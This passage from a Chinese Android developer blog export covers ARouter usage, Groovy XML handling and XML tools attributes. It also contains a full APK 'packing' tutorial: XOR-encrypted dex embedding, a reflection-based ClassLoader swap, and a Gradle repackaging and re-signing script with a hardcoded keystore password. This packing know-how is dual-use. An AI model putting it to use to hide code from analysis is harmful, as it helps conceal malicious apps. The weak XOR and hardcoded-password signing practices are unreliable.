然后调用ARoute的inject方法即可： 1ARouter.getInstance().inject(this); 使用新旧转场动画处理跳转旧动画：使用withTransition方法即可： 12ARouter.getInstance().build(testUri).withTransition(R.anim.slide_in, R.anim.slide_out) .navigation(); 新动画：使用withOptionsCompat方法即可： 12345ActivityOptionsCompat compat = ActivityOptionsCompat. makeScaleUpAnimation(view, view.getWidth() / 2, view.getHeight() / 2, 0, 0); ARouter.getInstance().build(\"/module/jumpTestActivity2\").withOptionsCompat(compat) .navigation(); kotlin跳转与Java相似，声明Route注解并为path属性赋值： 12@Route(path = &quot;/kotlin/test&quot;)class KotlinTestActivity : Activity() &#123; 然后跳转即可： 123ARouter.getInstance() .build(\"/kotlin/test\") .navigation(); 接口调用除了跳转Activity外，ARouter还允许用户进行接口调用首先我们需要新建接口，我们的接口需要继承IProvider接口： 1234public interface MyServiceInterface extends IProvider &#123; void doSomething();&#125; 接着实现这个接口： 12345678910111213@Route(path = \"/interface/my-service\")public class MyServiceImpl implements MyServiceInterface &#123; @Override public void doSomething() &#123; Log.d(\"MyServiceImpl\", \"I just do something!\"); &#125; @Override public void init(Context context) &#123; Log.d(\"MyServiceImpl\", \"init!\"); &#125;&#125; 我们可以在init方法中进行一些接口首次被调用时的初始化操作。 调用接口的方式有几种：使用url调用接口： 12((MyServiceInterface) ARouter.getInstance().build(\"/interface/my-service\").navigation()) .doSomething(); 通过类型（.class）来调用接口： 1ARouter.getInstance().navigation(MyServiceImpl.class).doSomething(); 获取FragmentARouter还允许我们获取某个Fragment：使用Route注解声明： 12@Route(path = \"/test/fragment\")public class BlankFragment extends Fragment &#123; 通过url获取： 1Fragment fragment = (Fragment) ARouter.getInstance().build(\"/test/fragment\").navigation(); 跨模块调用ARouter的调用除了能在本module中运行外，也可以跨module运行，由于代码类似，在此不多研究 处理跳转结果ARouter可以让我们处理跳转过程的结果： 123456789101112ARouter.getInstance().build(\"/module/jumpTestActivity2\").navigation(null, new NavigationCallback() &#123; @Override public void onFound(Postcard postcard) &#123; // 找到目标后进行的操作 &#125; @Override public void onLost(Postcard postcard) &#123; // 找不到目标进行的操作 &#125; &#125;); 拦截器ARouter的拦截器可以在navigation的过程中拦截请求，并进行一系列的处理，是一种AOP的编程模式（应用场景为检查登录状态等）要实现拦截器，首先我们需要实现IInterceptor接口，并使用Interceptor注解标记我们的拦截器，并传入priority优先级参数（数字越小、优先级越高）例子：这里实现了两个拦截器： 12345678910111213141516171819202122232425262728@Interceptor(priority = 6)public class MyInterceptorFirst implements IInterceptor &#123; @Override public void process(Postcard postcard, InterceptorCallback callback) &#123; Log.i(\"MyInterceptorFirst\", postcard.toString()); callback.onContinue(postcard); &#125; @Override public void init(Context context) &#123; Log.i(\"MyInterceptorFirst\", \"init\"); &#125;&#125;@Interceptor(priority = 7)public class MyInterceptorSecond implements IInterceptor &#123; @Override public void process(Postcard postcard, InterceptorCallback callback) &#123; Log.i(\"MyInterceptorSecond\", postcard.toString()); &#125; @Override public void init(Context context) &#123; Log.i(\"MyInterceptorSecond\", \"init\"); &#125;&#125; IInterceptor接口定义了两个方法： init方法：在ARouter初始化的时候会调用，用于进行一系列初始化操作 process方法：拦截请求的处理方法，分别传入Postcard（请求的具体信息），InterceptorCallback（用于控制拦截流程）两个参数 这里说一下InterceptorCallback这个参数，这个接口定义了两个方法： onContinue：传入Postcard参数（可以更改请求参数），表示当前拦截器放行此请求（该请求可以被更低优先级的拦截器拦截，或者没有拦截器了就执行对应操作） onInterrupt：拦截此次请求，不再传递下去 如果不调用任何方法则默认拦截此次请求 因此，上面例子中的拦截器实现的效果是，分别执行MyInterceptorFirst、MyInterceptorSecond拦截器，并拦截请求，无法跳转 以上就是本人探究的ARouter的功能，如有遗漏欢迎补充~","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Android 加壳尝试（一）","slug":"Android-加壳尝试（一）","date":"2017-09-11T13:00:15.000Z","updated":"2020-05-11T07:23:44.529Z","comments":true,"path":"2017/09/11/Android-加壳尝试（一）/","link":"","permalink":"https://superxlcr.github.io/2017/09/11/Android-加壳尝试（一）/","excerpt":"","text":"最近看了一篇Android加壳相关的文章：http://blog.csdn.net/jiangwei0910410003/article/details/48415225尝试根据文章的步骤来实现Android加壳的功能，在发现文章实现的效果不大理想后，本人进行了一定的调整与改进 实现效果实现效果如下： reinforceTest是我们的加壳Android工程，我们把需要加壳的apk放置在其workspace目录下接着在reinforceTest工程下运行gradle的task：buildReinforceApk 在workspace目录下，我们可以找到加壳后的output.apk 加壳后的apk可正常运行： 通过dex2jar以及jd-gui，我们可以看到dex中的壳代码，但是看不到源apk的代码： 原理简介加壳的原理大致如下图所示： 壳apk（即reinforceTest工程）的主要作用用是提供壳classes.dex，用于在启动app时解析出源classes.dex，并引导程序执行classes.dex的代码引导程序执行真正classes.dex文件的步骤如下： 引导的Application如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186public class ReinforceApplication extends Application &#123; private static final String TAG = ReinforceApplication.class.getSimpleName(); private static final String ACTIVITY_THREAD = \"android.app.ActivityThread\"; private static final String LOADED_APK = \"android.app.LoadedApk\"; private static final String APPLICATION_CLASS_NAME = \"APPLICATION_CLASS_NAME\"; private String mDexFileName; private String mOdexPath; private String mLibPath; @Override protected void attachBaseContext(Context base) &#123; super.attachBaseContext(base); initDexEnvironment(); decryptDex(); replaceDexLoader(); &#125; @Override public void onCreate() &#123; // TODO provider onCreate? String appClassName = null; // 获取Application名字 try &#123; ApplicationInfo ai = this.getPackageManager() .getApplicationInfo(this.getPackageName(), PackageManager.GET_META_DATA); Bundle bundle = ai.metaData; if (bundle != null &amp;&amp; bundle.containsKey(APPLICATION_CLASS_NAME)) &#123; appClassName = bundle.getString(APPLICATION_CLASS_NAME); &#125; else &#123; return; &#125; &#125; catch (PackageManager.NameNotFoundException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; Log.i(TAG, appClassName); Object sCurrentActivityThread = RefInvoke.invokeStaticMethod( ACTIVITY_THREAD, \"currentActivityThread\", new Class[]&#123;&#125;, new Object[]&#123;&#125;); Object mBoundApplication = RefInvoke.getFieldObject( ACTIVITY_THREAD, \"mBoundApplication\", sCurrentActivityThread); Object info = RefInvoke.getFieldObject( ACTIVITY_THREAD + \"$AppBindData\", \"info\", mBoundApplication); // 把当前进程的mApplication 设置成null RefInvoke.setFieldObject(LOADED_APK, \"mApplication\", info, null); // 删除oldApplication Object oldApplication = RefInvoke.getFieldObject( ACTIVITY_THREAD, \"mInitialApplication\", sCurrentActivityThread); ArrayList&lt;Application&gt; mAllApplications = (ArrayList&lt;Application&gt;) RefInvoke .getFieldObject(ACTIVITY_THREAD, \"mAllApplications\", sCurrentActivityThread); mAllApplications.remove(oldApplication); ApplicationInfo appInfoInLoadedApk = (ApplicationInfo) RefInvoke .getFieldObject(LOADED_APK, \"mApplicationInfo\", info); ApplicationInfo appInfoInAppBindData = (ApplicationInfo) RefInvoke .getFieldObject(ACTIVITY_THREAD + \"$AppBindData\", \"appInfo\", mBoundApplication); appInfoInLoadedApk.className = appClassName; appInfoInAppBindData.className = appClassName; // 执行 makeApplication（false,null），此功能需要把当前进程的mApplication 设置成null Application app = (Application) RefInvoke.invokeMethod( LOADED_APK, \"makeApplication\", info, new Class[]&#123;boolean.class, Instrumentation.class&#125;, new Object[]&#123;false, null&#125;); RefInvoke.setFieldObject(ACTIVITY_THREAD, \"mInitialApplication\", sCurrentActivityThread, app); ArrayMap mProviderMap = (ArrayMap) RefInvoke .getFieldObject(ACTIVITY_THREAD, \"mProviderMap\", sCurrentActivityThread); Iterator it = mProviderMap.values().iterator(); while (it.hasNext()) &#123; Object providerClientRecord = it.next(); Object localProvider = RefInvoke .getFieldObject(ACTIVITY_THREAD + \"$ProviderClientRecord\", \"mLocalProvider\", providerClientRecord); RefInvoke.setFieldObject(\"android.content.ContentProvider\", \"mContext\", localProvider, app); &#125; Log.i(TAG, \"app:\" + app); app.onCreate(); &#125; private void initDexEnvironment() &#123; mDexFileName = getApplicationInfo().dataDir + \"/real.dex\"; mOdexPath = getApplicationInfo().dataDir + \"/odex\"; File odexDir = new File(mOdexPath); if (!odexDir.exists()) &#123; odexDir.mkdir(); &#125; mLibPath = getApplicationInfo().nativeLibraryDir; &#125; private void decryptDex() &#123; byte[] dex = readDexFromApk(); if (dex != null) &#123; byte[] realDexBytes = decryption(dex); if (realDexBytes != null) &#123; try &#123; File realDex = new File(mDexFileName); if (realDex.exists()) &#123; realDex.delete(); &#125; realDex.createNewFile(); FileOutputStream fos = new FileOutputStream(realDex); fos.write(realDexBytes); fos.flush(); fos.close(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; &#125; &#125; &#125; private byte[] readDexFromApk() &#123; File sourceApk = new File(getPackageCodePath()); try &#123; ZipInputStream zis = new ZipInputStream(new FileInputStream(sourceApk)); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ZipEntry entry; while ((entry = zis.getNextEntry()) != null) &#123; if (entry.getName().equals(\"classes.dex\")) &#123; byte[] bytes = new byte[1024]; int len; while ((len = zis.read(bytes)) != -1) &#123; baos.write(bytes, 0, len); baos.flush(); &#125; return baos.toByteArray(); &#125; &#125; zis.close(); return null; &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); return null; &#125; &#125; private byte[] decryption(byte[] dex) &#123; int totalLen = dex.length; byte[] realDexLenBytes = new byte[4]; System.arraycopy(dex, totalLen - 4, realDexLenBytes, 0, 4); ByteArrayInputStream bais = new ByteArrayInputStream(realDexLenBytes); DataInputStream ins = new DataInputStream(bais); int realDexLen; try &#123; realDexLen = ins.readInt(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); return null; &#125; byte[] realDexBytes = new byte[realDexLen]; System.arraycopy(dex, totalLen - 4 - realDexLen, realDexBytes, 0, realDexLen); return decrypt(realDexBytes); &#125; private byte[] decrypt(byte[] bytes) &#123; // TODO byte[] result = new byte[bytes.length]; for (int i = 0; i &lt; bytes.length; i++) &#123; result[i] = (byte) (bytes[i] ^ 0x4598); &#125; return result; &#125; private void replaceDexLoader() &#123; Object sCurrentActivityThread = RefInvoke .invokeStaticMethod(ACTIVITY_THREAD, \"currentActivityThread\", null, null); String packageName = getPackageName(); ArrayMap mPackages = (ArrayMap) RefInvoke .getFieldObject(ACTIVITY_THREAD, \"mPackages\", sCurrentActivityThread); WeakReference weakReference = (WeakReference) mPackages.get(packageName); Object loadedApk = weakReference.get(); ClassLoader mClassLoader = (ClassLoader) RefInvoke .getFieldObject(LOADED_APK, \"mClassLoader\", loadedApk); DexClassLoader dexClassLoader = new DexClassLoader(mDexFileName, mOdexPath, mLibPath, mClassLoader); RefInvoke.setFieldObject(LOADED_APK, \"mClassLoader\", loadedApk, dexClassLoader); &#125;&#125; reinforceTest工程具体的加壳步骤如下所示： 123456789101112task buildReinforceApk(dependsOn: 'assembleDebug') &lt;&lt; &#123; // 清理目录 cleanDir(); // 解压apk decodeApk(); // 修改Manifest文件 modifyManifest(); // 加壳 reinforce(); // 重新打包apk并签名 rebuildAndSign();&#125; 这里的Gradle Task依赖了assembleDebug Task，用于获取最新的壳apk 清理目录就不多说了，解压apk使用的是apktool工具，把源apk与壳apk反编译出来： 1234567891011121314151617181920private void decodeApk() &#123; // 复制解壳apk copy &#123; from 'build/outputs/apk/app-debug.apk' into WORKSPACE rename &#123; REIN_FORCE_APK &#125; &#125; // 解压解壳apk exec &#123; workingDir WORKSPACE commandLine 'java', '-jar', TOOLS_DIR + APK_TOOL, 'd', '-s', REIN_FORCE_APK, '-o', REIN_FORCE_DIR &#125; // 解压源apk exec &#123; workingDir WORKSPACE commandLine 'java', '-jar', TOOLS_DIR + APK_TOOL, 'd', '-s', SRC_APK, '-o', SRC_DIR &#125;&#125; 接着是修改源apk的AndroidManifest.xml文件，为啥要修改呢？首先因为源apk上有我们需要的资源文件，所以我们肯定是把加壳后的dex放入源apk中，而不是放入壳apk中。由上面的引导步骤图我们得知，我们解壳时需要先执行壳apk的Application。如果加壳后的dex放入源apk中，我们的解壳Application由于没有在源apk的AndroidManifest中注册，因此无法率先执行。所以，我们需要修改源apk的AndroidManifest，把Application的name改为壳apk的Application，同时添加一项meta-data，用于记录源apk的Application的名字，让我们在待会替换回真正的Application时知道它的名字： 123456789101112131415161718192021222324252627282930313233private void modifyManifest() &#123; // 声明命名空间 def android = new Namespace('http://schemas.android.com/apk/res/android', 'android') // 获取源apk application name def parser = new XmlParser() def srcManifest = parser.parse(\"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/AndroidManifest.xml\") def srcApp = srcManifest.application[0].attribute(android.name) // 获取壳apk application name def reinforceManifest = new XmlParser().parse(\"$&#123;WORKSPACE&#125;$&#123;REIN_FORCE_DIR&#125;/AndroidManifest.xml\") def reinforceApp = reinforceManifest.application[0].attribute(android.name) // 合成新Manifest // 新建meta-data节点，记录源apk application Name parser.createNode( srcManifest.application[0], new QName('http://schemas.android.com/apk/res/android', 'meta-data'), [ (android.name):'APPLICATION_CLASS_NAME', (android.value):srcApp ] ) // 修改application节点，改为壳apk application Name srcManifest.application[0].attributes().put(android.name, reinforceApp) println srcManifest.application[0].attribute(android.name) // 写入文件 Writer writer = new FileWriter(\"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/AndroidManifest.xml\") writer.write(XmlUtil.serialize(srcManifest)) writer.flush()&#125; 接着就是加壳的步骤了，这里主要调用了用Java写的加壳工具： 1234567891011121314151617private void reinforce() &#123; // 加壳 OutputStream os = new ByteArrayOutputStream(); exec &#123; workingDir TOOLS_DIR // 参数为 源dex 壳dex 输出dex commandLine 'java', '-cp', '.', 'DexTools', \"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/classes.dex\", \"$&#123;WORKSPACE&#125;$&#123;REIN_FORCE_DIR&#125;/classes.dex\", WORKSPACE + OUTPUT_DEX standardOutput = os; &#125; println os.toString() // 输出dex替换源dex file(\"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/classes.dex\").delete(); copy &#123; from WORKSPACE + OUTPUT_DEX into WORKSPACE + SRC_DIR &#125;&#125; 工具Java代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124public class DexTools &#123; public static void main(String[] args) &#123; if (args.length != 3) &#123; System.out.println(\"plz enter srcDex , reinforceDex and outputDex\"); System.exit(0); &#125; try &#123; // 源dex File srcDex = new File(args[0]); // 壳dex File reinForceDex = new File(args[1]); // 对源dex进行加密 byte[] encryptSrcApkBytes = encrypt(readFileBytes(srcDex)); byte[] reinForceDexBytes = readFileBytes(reinForceDex); // 新dex长度，4字节用于存放源apk长度 int totalLen = encryptSrcApkBytes.length + reinForceDexBytes.length + 4; byte[] newDex = new byte[totalLen]; // 先拷贝壳dex System.arraycopy(reinForceDexBytes, 0, newDex, 0, reinForceDexBytes.length); // 再拷贝源dex System.arraycopy(encryptSrcApkBytes, 0, newDex, reinForceDexBytes.length, encryptSrcApkBytes.length); // 写上源dex长度 System.arraycopy(int2byte(encryptSrcApkBytes.length), 0, newDex, totalLen - 4, 4); // 修改dex文件长度 fixHeaderFileSize(newDex); // 修改dex签名 fixHeaderSignature(newDex); // 修改dex校验和 fixHeaderCheckSum(newDex); File outputDex = new File(args[2]); if (!outputDex.exists()) &#123; outputDex.createNewFile(); &#125; FileOutputStream fos = new FileOutputStream(outputDex); fos.write(newDex); fos.flush(); fos.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private static byte[] readFileBytes(File file) &#123; if (file.canRead()) &#123; try &#123; FileInputStream fis = new FileInputStream(file); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int len; byte[] bytes = new byte[1024]; while ((len = fis.read(bytes)) != -1) &#123; baos.write(bytes, 0, len); &#125; fis.close(); return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; return null; &#125; private static byte[] encrypt(byte[] bytes) &#123; // TODO byte[] result = new byte[bytes.length]; for (int i = 0; i &lt; bytes.length; i++) &#123; result[i] = (byte) (bytes[i] ^ 0x4598); &#125; return result; &#125; private static byte[] int2byte(int number) &#123; byte[] bytes = new byte[4]; for (int i = 3; i &gt;= 0; i--) &#123; bytes[i] = (byte) (number % 256); number &gt;&gt;= 8; &#125; return bytes; &#125; private static void fixHeaderFileSize(byte[] dex) &#123; byte[] newSize = int2byte(dex.length); // 修改（32-35）file_size System.arraycopy(changeBytesOrder(newSize), 0, dex, 32, 4); &#125; private static void fixHeaderSignature(byte[] dex) throws NoSuchAlgorithmException &#123; MessageDigest md = MessageDigest.getInstance(\"SHA-1\"); // 计算从32位到文件尾的sha-1值 md.update(dex, 32, dex.length - 32); byte[] newSignature = md.digest(); // 修改（12-31）signature System.arraycopy(newSignature, 0, dex, 12, 20); &#125; private static void fixHeaderCheckSum(byte[] dex) &#123; Adler32 adler32 = new Adler32(); // 计算从12位到文件尾的校验和 adler32.update(dex, 12, dex.length - 12); long checkSum = adler32.getValue(); byte[] checkSumBytes = int2byte((int) checkSum); // 修改（8-11）checkSum System.arraycopy(changeBytesOrder(checkSumBytes), 0, dex, 8, 4); &#125; private static byte[] changeBytesOrder(byte[] bytes) &#123; int length = bytes.length; byte[] result = new byte[length]; for (int i = 0; i &lt; length; i++) &#123; result[i] = bytes[length - 1 - i]; &#125; return result; &#125;&#125; 具体的加壳原理可以参考文章顶部的链接，其中有提及，在此不做赘述加壳后的dex如下所示： 加壳完后把新的dex覆盖旧的源apk的dex，由于文件进行了改动，因此apk在重新打包后需要重新签名： 1234567891011121314151617181920212223private void rebuildAndSign() &#123; // 打包apk exec &#123; workingDir WORKSPACE commandLine 'java', '-jar', TOOLS_DIR + APK_TOOL, 'b', SRC_DIR &#125; // 复制打包完的apk copy &#123; from \"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/dist/$&#123;SRC_APK&#125;\" into WORKSPACE rename &#123; OUTPUT_UNSIGNED_APK &#125; &#125; exec &#123; workingDir WORKSPACE commandLine 'jarsigner', '-sigalg', 'MD5withRSA', '-digestalg', 'SHA1', '-keystore', rootDir.getAbsolutePath() + '/reinforceTestKey.jks', '-storepass', '123456', '-signedjar', OUTPUT_APK, OUTPUT_UNSIGNED_APK, 'Dummy' &#125;&#125; 存在问题目前这种加壳方式在测试过程中发现仍存在一些问题： 不支持AppCompatActivity：当源apk使用AppCompatActivity时，会出现资源找不到的错误，具体原因未知，以后再做研究 ContentProvider不清楚是否支持：根据执行顺序，在APK中最先执行的几个方法应该为：Application.attachBaseContext -&gt; ContentProvider.onCreate -&gt; Application.onCreate。这里我们选择在Application.attachBaseContext以及Application.onCreate进行解壳以及引导程序执行的操作，不清楚是否会对ContentProvider造成影响，打算以后再做测试 github地址：https://github.com/superxlcr/reinforceTest","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Groovy中对xml的操作补充","slug":"Groovy中对xml的操作补充","date":"2017-09-07T15:37:22.000Z","updated":"2020-05-11T07:23:44.684Z","comments":true,"path":"2017/09/07/Groovy中对xml的操作补充/","link":"","permalink":"https://superxlcr.github.io/2017/09/07/Groovy中对xml的操作补充/","excerpt":"","text":"Android中Gradle编译器使用的是Groovy语言，Groovy为我们提供了一系列的工具类用于处理xml文件。关于Groovy中如何对xml文档进行操作，这里有一处文档：http://www.groovy-lang.org/processing-xml.html在此，补充一些文档中遗漏的点： 一些Groovy中的xml工具类找不到可以尝试 1import groovy.xml.* 类似于Namespace、QName以及XmlUtil工具类，均在groovy.xml包中 关于namespace的问题xml中namespace（命名空间）为的是提供避免元素命名冲突的方法，但却让我们访问xml文档变得十分不方便在Groovy中，我们常用的xml解析器有XmlSlurper以及XmlPraser，他们的具体用法可以参考上面链接中的介绍，下面分别来讲讲两种解析器如何解析带命名空间的xml文件 XmlSlurperXmlSlurper比较简单，在解析xml文件的同时声明命名空间即可： 123def testManifest = new XmlSlurper().parse(\"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/AndroidManifest.xml\")testManifest.declareNamespace('android':'http://schemas.android.com/apk/res/android')println testManifest.application[0].@\"android:name\" 上面代码是访问AndroidManifest文件中Application元素下的android:name属性的示例 XmlParserXmlParser则比较麻烦，我们需要先声明一个Namespace对象，然后再使用attribute方法获取元素属性（目前找不到别的写法……） 1234567// 声明命名空间def android = new Namespace('http://schemas.android.com/apk/res/android', 'android')// 获取apk application namedef parser = new XmlParser()def srcManifest = parser.parse(\"$&#123;WORKSPACE&#125;$&#123;SRC_DIR&#125;/AndroidManifest.xml\")def srcApp = srcManifest.application[0].attribute(android.name) 关于动态修改xml中元素的属性在上面链接中，我们学会了通过xmlParser修改xml的元素属性，在此我们再补充一种修改元素属性的方法由于xml中元素属性载入内存后其实是存在Map中的，因此我们可以通过attributes方法获取Map，并使用put方法修改对应属性： 1srcManifest.application[0].attributes().put(android.name, value) 上面代码是把AndroidManifest文件中Application元素的android:name属性改为value值 最后，对于Groovy中的类有任何不懂的问题，我们都可以通过查看其文档解决：http://docs.groovy-lang.org/latest/html/api/","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"android中xml tools属性详解","slug":"android中xml-tools属性详解","date":"2017-08-27T02:28:59.000Z","updated":"2020-05-11T07:23:44.768Z","comments":true,"path":"2017/08/27/android中xml-tools属性详解/","link":"","permalink":"https://superxlcr.github.io/2017/08/27/android中xml-tools属性详解/","excerpt":"","text":"本文转载自：http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2015/0309/2567.html 第一部分安卓开发中，在写布局代码的时候，ide可以看到布局的预览效果。 但是有些效果则必须在运行之后才能看见，比如这种情况：TextView在xml中没有设置任何字符，而是在activity中设置了text。因此为了在ide中预览效果，你必须在xml中为TextView控件设置android:text属性 1234567&lt;TextView android:id=\"@+id/text_main\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:textAppearance=\"@style/TextAppearance.Title\" android:layout_margin=\"@dimen/main_margin\" android:text=\"I am a title\" /&gt; 一般我们在这样做的时候都告诉自己，没关系，等写完代码我就把这些东西一并删了。但是你可能会忘，以至于在你的最终产品中也会有这样的代码。 用tools吧，别做傻事以上的情况是可以避免的，我们使用tools命名空间以及其属性来解决这个问题。 1xmlns:tools=\"http://schemas.android.com/tools\" tools可以告诉Android Studio，哪些属性在运行的时候是被忽略的，只在设计布局的时候有效。比如我们要让android:text属性只在布局预览中有效可以这样 1234567&lt;TextView android:id=\"@+id/text_main\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:textAppearance=\"@style/TextAppearance.Title\" android:layout_margin=\"@dimen/main_margin\" tools:text=\"I am a title\" /&gt; tools可以覆盖android的所有标准属性，将android:换成tools:即可。同时在运行的时候就连tools:本身都是被忽略的，不会被带进apk中。 tools属性的种类tools属性可以分为两种：一种是影响Lint提示的，一种是关于xml布局设计的。以上介绍的是tools的最基本用法：在UI设计的时候覆盖标准的android属性，属于第二种。下面介绍Lint相关的属性。Lint相关的属性 123tools:ignoretools:targetApitools:locale tools:ignoreignore属性是告诉Lint忽略xml中的某些警告。假设我们有这样的一个ImageView 1234567&lt;ImageView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_marginStart=\"@dimen/margin_main\" android:layout_marginTop=\"@dimen/margin_main\" android:scaleType=\"center\" android:src=\"@drawable/divider\" /&gt; Lint会提示该ImageView缺少android:contentDescription属性。我们可以使用tools:ignore来忽略这个警告： 12345678&lt;ImageView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_marginStart=\"@dimen/margin_main\" android:layout_marginTop=\"@dimen/margin_main\" android:scaleType=\"center\" android:src=\"@drawable/divider\" tools:ignore=\"contentDescription\" /&gt; tools:targetApi假设minSdkLevel 15，而你使用了api21中的控件比如RippleDrawable 12&lt;ripple xmlns:android=\"http://schemas.android.com/apk/res/android\" android:color=\"@color/accent_color\" /&gt; 则Lint会提示警告。为了不显示这个警告，可以： 1234&lt;ripple xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:color=\"@color/accent_color\" tools:targetApi=\"LOLLIPOP\" /&gt; tools:locale（本地语言）属性默认情况下res/values/strings.xml中的字符串会执行拼写检查，如果不是英语，会提示拼写错误，通过以下代码来告诉studio本地语言不是英语，就不会有提示了。 12345678&lt;resources xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" tools:locale=\"it\"&gt; &lt;!-- Your strings go here --&gt; &lt;/resources&gt; 这篇文章首先介绍了tools的最基本用法-覆盖android的属性，然后介绍了忽略Lint提示的属性。下篇文章中，我们将继续介绍关于UI预览的其他属性（非android标准属性）。ps：关于忽略Lint的属性，如果不想了解的话也没关系，因为并不影响编译，一般我都不会管这些警告。 第二部分这部分我们将继续介绍关于UI预览的其他属性（非android标准属性）。 tools:context tools:menu tools:actionBarNavMode tools:listitem/listheader/listfooter tools:showIn tools:layout tools:contextcontext属性其实正是的称呼是activity属性，有了这个属性，ide就知道在预览布局的时候该采用什么样的主题。同时他还可以在android studio的java代码中帮助找到相关的文件（Go to Related files） 该属性的值是activity的完整包名 123456789&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/container\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" tools:context=\"com.android.example.MainActivity\"&gt; &lt;!-- ... --&gt;&lt;/LinearLayout&gt; tools:menu告诉IDE 在预览窗口中使用哪个菜单，这个菜单将显示在layout的根节点上（actionbar的位置）。 其实预览窗口非常智能，如果布局和一个activity关联（指上面所讲的用tools:context关联）它将会自动查询相关activity的onCreateOptionsMenu方法中的代码，以显示菜单。而menu属性则可以覆盖这种默认的行为。你还可以为menu属性定义多个菜单资源，不同的菜单资源之间用逗号隔开。 1tools:menu=\"menu_main,menu_edit\" 如果你不希望在预览图中显示菜单则： 1tools:menu=\"\" 最后需要注意，当主题为Theme.AppCompat时，这个属性不起作用。 tools:actionBarNavMode这个属性告诉ide app bar（Material中对actionbar的称呼）的显示模式，其值可以是 123standardtabslist 123456&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" tools:actionBarNavMode=\"tabs\" /&gt; 同样的，当主题是Theme.AppCompat (r21+, at least)或者Theme.Material,或者使用了布局包含Toolbar的方式。 该属性也不起作用，只有holo主题才有效。 listitem, listheader 和listfooter 属性 顾名思义就是在ListView ExpandableListView等的预览效果中添加头部 尾部 以及子item的预览布局。 1234567&lt;GridView android:id=\"@+id/list\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" tools:listheader=\"@layout/list_header\" tools:listitem=\"@layout/list_item\" tools:listfooter=\"@layout/list_footer\" /&gt; layout属性tools:layout告诉ide，Fragment在程序预览的时候该显示成什么样 123456789&lt;fragment xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/item_list\" android:name=\"com.example.fragmenttwopanel.ItemListFragment\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:layout_marginLeft=\"16dp\" android:layout_marginRight=\"16dp\" tools:layout=\"@android:layout/list_content\" /&gt; tools:showIn 该属性设置于一个被其他布局&lt;include&gt;的布局的根元素上。这让您可以指向包含此布局的其中一个布局，在设计时这个被包含的布局会带着周围的外部布局被渲染。这将允许您“在上下文中”查看和编辑这个布局。需要 Studio 0.5.8 或更高版本。 关于tools 就介绍完了。 注：原文是两篇文章 Tools of the trade — Part 1 Tools of the trade — Part 2 。 觉得完全可以在一篇文章中讲完，就翻译在了一起，原文有很多和内容无关的gif图，描述也比较啰嗦，都被我去掉了，这篇文章属于意译。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"资源文件","slug":"资源文件","permalink":"https://superxlcr.github.io/tags/资源文件/"}]},{"title":"Java Enum枚举替代方案--Android IntDef/StringDef Annotation注解","slug":"Java-Enum枚举替代方案-Android-IntDef-StringDef-Annotation注解","date":"2017-08-23T07:48:17.000Z","updated":"2020-05-11T07:23:44.704Z","comments":true,"path":"2017/08/23/Java-Enum枚举替代方案-Android-IntDef-StringDef-Annotation注解/","link":"","permalink":"https://superxlcr.github.io/2017/08/23/Java-Enum枚举替代方案-Android-IntDef-StringDef-Annotation注解/","excerpt":"","text":"原文链接：https://noobcoderblog.wordpress.com/2015/04/12/java-enum-and-android-intdefstringdef-annotation/ 